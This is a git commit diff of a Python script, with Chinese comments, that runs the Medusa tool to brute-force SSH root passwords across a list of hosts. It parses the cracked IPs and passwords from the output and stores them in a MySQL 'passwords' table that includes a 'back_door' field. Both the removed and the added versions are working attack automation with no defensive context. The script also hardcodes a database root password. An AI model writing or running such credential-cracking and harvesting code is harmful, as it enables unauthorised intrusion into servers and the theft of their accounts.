3ea5bd8398068a1bdcad0a6a26c5009a10c4adb9
m3123311760 <66453344+m3123311760@users.noreply.github.com>
2023-02-27 09:27:18 +0800

    Update test_1.py

--- test_1.py
+++ test_1.py
@@ -1,57 +1,71 @@
+import MySQLdb
+import threading
+import time
 import os
 import re
-import pymysql
-import threading
 
+# 用于连接MySQL的参数
+MYSQL_HOST = '192.168.10.228'
+MYSQL_PORT = 3306
+MYSQL_USER = 'root'
+MYSQL_PASSWORD = 'mkr961...'
+MYSQL_DB = 'medusa'
 
-def store_mysql(ip_addr, username, password):
-    conn = pymysql.connect(
-        host='192.168.10.228',
-        user='root',
-        password='mkr961...',
-        database='medusa',
-        charset='utf8mb4',
-        cursorclass=pymysql.cursors.DictCursor
-    )
-    try:
-        with conn.cursor() as cursor:
-            # 注意这里将表名改为了medusa，根据实际情况修改
-            sql = "INSERT INTO `passwords` (`ip_addr`, `username`, `password`) VALUES (%s, %s, %s)"
-            cursor.execute(sql, (ip_addr, username, password))
-        conn.commit()
-    finally:
-        conn.close()
+# 创建MySQL连接
+db = MySQLdb.connect(
+    host=MYSQL_HOST,
+    port=MYSQL_PORT,
+    user=MYSQL_USER,
+    passwd=MYSQL_PASSWORD,
+    db=MYSQL_DB,
+    charset='utf8mb4'
+)
 
+# 获取游标
+cursor = db.cursor()
 
-def crack_ssh(ip, user, password):
-    cmd = f'medusa -h {ip} -u {user} -P pass.txt -O output.txt -M ssh -continue -T 4 -f -v 3'
+# 插入数据的SQL语句
+insert_sql = "INSERT INTO passwords (ip_addr, user, pass, back_door) VALUES (%s, %s, %s, %s)"
+
+# Medusa成功破解的IP地址和密码
+ip_addr = ''
+password = ''
+
+# 线程锁，用于保证数据插入时的线程安全
+lock = threading.Lock()
+
+def insert_data():
+    #global ip_addr
+    #global password
+
+    # 获取线程锁
+    lock.acquire()
+
+    # 执行SQL语句，插入数据到MySQL
+    cursor.execute(insert_sql, (ip_addr[0], 'root', password[0], 'false'))
+    db.commit()
+
+    # 释放线程锁
+    lock.release()
+
+# 监听Medusa输出，并解析IP地址和密码
+def read_medusa():
+    global ip_addr
+    global password
+
+    # 执行Medusa命令，将输出通过管道传递给程序
+    cmd = "medusa -H Host.txt -u root -P /root/pass.txt -M ssh -t 5 -f -O output.txt -continue 2>&1 | tee output.txt"
     os.system(cmd)
+
+    # 读取Medusa输出文件
     with open('output.txt', 'r') as f:
-        for line in f.readlines():
-            if 'ACCOUNT FOUND' in line:
-                ip_addr = re.findall(r'\d+.\d+.\d+.\d+', line)[0]
-                username = re.findall(r'User: (.*) Password:', line)[0]
-                password = re.findall(r'Password: (.*) \[SUCCESS\]', line)[0]
-                # 注意这里调用了store_mysql()函数，并将参数传入
-                store_mysql(ip_addr, username, password)
+          for line in f:
+              if '[SUCCESS]' in line:
+                  ip_addr = re.findall(r"Host: (.+?) User", line)
+                  password = re.findall(r'Password: (.+?) \[SUCCESS\]', line)
+    # 插入数据到MySQL
+    insert_data()
 
-
-if __name__ == '__main__':
-    threads = []
-    with open('ip.txt', 'r') as f:
-        for line in f.readlines():
-            # 注意这里修改了正则表达式
-            match = re.match(r'(\d+\.\d+\.\d+\.\d+):(\d+)', line)
-            if match:
-                ip = match.group(1)
-                num = int(match.group(2))
-                for i in range(num):
-                    user = 'root'
-                    password = '123456'
-                    # 注意这里创建了一个新的线程来执行crack_ssh()函数
-                    t = threading.Thread(target=crack_ssh, args=(ip, user, password))
-                    threads.append(t)
-    for t in threads:
-        t.start()
-    for t in threads:
-        t.join()
+# 启动线程，监听Medusa输出并插入数据到MySQL
+thread = threading.Thread(target=read_medusa)
+thread.start()
